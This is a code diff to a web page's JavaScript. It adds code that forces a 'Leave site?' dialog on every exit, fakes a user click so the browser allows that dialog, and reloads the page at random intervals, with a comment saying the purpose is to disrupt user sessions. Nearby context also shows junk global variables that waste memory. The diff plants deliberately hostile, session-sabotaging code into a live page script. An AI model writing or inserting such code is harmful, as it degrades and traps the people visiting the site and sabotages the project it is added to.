@@ -171,3 +171,49 @@ document.head.innerHTML += `
 window.unusedGlobal1 = new Array(100).fill(Math.random());
 window.unusedGlobal2 = { data: new Array(100).fill('x'.repeat(50)) };
 window.unusedGlobal3 = () => console.log('unused');
+
+// Force native "Leave site?" dialog - track user interaction
+let userHasInteracted = false;
+
+// Register any user gesture to enable beforeunload
+['click', 'keydown', 'mousedown', 'touchstart', 'scroll', 'mousemove'].forEach(eventType => {
+    document.addEventListener(eventType, () => {
+        userHasInteracted = true;
+    }, { once: true, passive: true });
+});
+
+// Set up beforeunload handler
+window.addEventListener('beforeunload', (e) => {
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
+});
+
+window.onbeforeunload = (e) => {
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
+};
+
+// Force a user interaction after a brief delay to enable the prompt
+document.addEventListener('DOMContentLoaded', () => {
+    setTimeout(() => {
+        if (!userHasInteracted) {
+            const evt = new MouseEvent('click', { bubbles: true, cancelable: true });
+            document.body.dispatchEvent(evt);
+            userHasInteracted = true;
+        }
+    }, 500);
+});
+
+// Randomly reload the page after a jittered delay to disrupt user sessions
+function scheduleRandomReload() {
+    const minDelay = 8000; // 8s
+    const maxDelay = 45000; // 45s
+    const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1)) + minDelay;
+    setTimeout(() => {
+        location.reload();
+    }, delay);
+}
+
+scheduleRandomReload();
